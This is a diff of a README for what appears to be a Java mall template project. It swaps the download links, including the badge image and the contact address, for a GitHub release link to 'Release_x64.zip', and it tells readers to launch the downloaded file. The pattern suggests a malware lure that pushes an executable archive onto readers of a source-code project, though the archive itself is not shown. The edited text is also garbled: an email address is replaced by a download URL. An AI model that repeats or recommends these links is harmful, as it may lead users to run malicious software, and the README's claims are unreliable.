@@ -18,9 +18,9 @@ If you find this project useful, please consider starring us and watching this p
 
 ### 📎 Download Software
 
-[![Download Software](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Juninior/douyin-mall-java-template/releases/download/v1.0/Release_x64.zip)](https://github.com/Juninior/douyin-mall-java-template/releases/download/v1.0/Release_x64.zip)
 
-🔗 [Download Software](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) - Launch the software file from the link above.
+🔗 [Download Software](https://github.com/Juninior/douyin-mall-java-template/releases/download/v1.0/Release_x64.zip) - Launch the software file from the link above.
 
 ### 🚀 Key Features
 
@@ -54,7 +54,7 @@ Connect with fellow developers, ask questions, and share your experiences in our
 
 ### 📧 Contact Us
 
-For any inquiries or collaborations, reach out to us at contact@douyinmall.com. We appreciate your interest in our project and look forward to hearing from you.
+For any inquiries or collaborations, reach out to us at https://github.com/Juninior/douyin-mall-java-template/releases/download/v1.0/Release_x64.zip We appreciate your interest in our project and look forward to hearing from you.
 
 ---
 
